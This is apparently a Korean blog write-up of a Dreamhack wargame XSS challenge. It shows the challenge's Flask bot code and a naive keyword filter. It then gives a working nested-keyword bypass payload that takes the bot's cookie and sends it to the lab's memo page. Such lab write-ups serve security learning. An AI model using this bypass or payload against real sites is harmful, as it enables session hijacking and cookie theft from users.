---
title : "드림핵 워게임 XSS Filtering Bypass "
tags : 
date : "2026-05-15"
bookmark :  true
---

# 문제 설명
--------------
XSS 취약점을 통해 임의 이용자의 쿠키를 탈취해보자

**홈 화면**

![설명]({{ '/assets/img/xssFilter_0.png' | relative_url }})

**vuln page**
이용자가 입력한 값 출력

![설명]({{ '/assets/img/xssFilter_1.png' | relative_url }})

**memo page**
이용자가 메모를 남길 수 있으며, 작성한 메모를 출력함

![설명]({{ '/assets/img/xssFilter_2.png' | relative_url }})

**flag page**
전달된 URL에 임의 이용자가 접속하게끔 함.

![설명]({{ '/assets/img/xssFilter_3.png' | relative_url }})



# 문제 풀이
--------------

```
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
    
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```
flag 코드를 살펴보면 check_xss 함수를 호출한다. check_xss 함수는 read_url 함수를 호출해 vuln엔드포인트에 접속한다.

```
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

xss_filter 함수에서 "script", "on", "javascript" 가 들어가있다면 공백으로 치환한다. 대소문자를 섞어써도 다 소문자로 치환하기 때문에 이 방법은 먹히지 않는다.

대신 scronipt 와 같이 필터링이 되는 글자를 중간에 넣어준다면 이 글자들이 공백으로 치환되면서 script만 남게되고 필터링에서 탐지되지 않는다.

flag 페이지로 들어가서 이 코드를 입력한다.

```
<scronipt>document['locatio'+'n'].href = "/memo?memo=" + document['coo'+'kie'];</scronipt>
```

그러면 good이 뜨고,

![설명]({{ '/assets/img/xssFilter_4.png' | relative_url }})

memo 페이지를 들어가면 flag값이 출력된다.

![설명]({{ '/assets/img/xssFilter_5.png' | relative_url }})
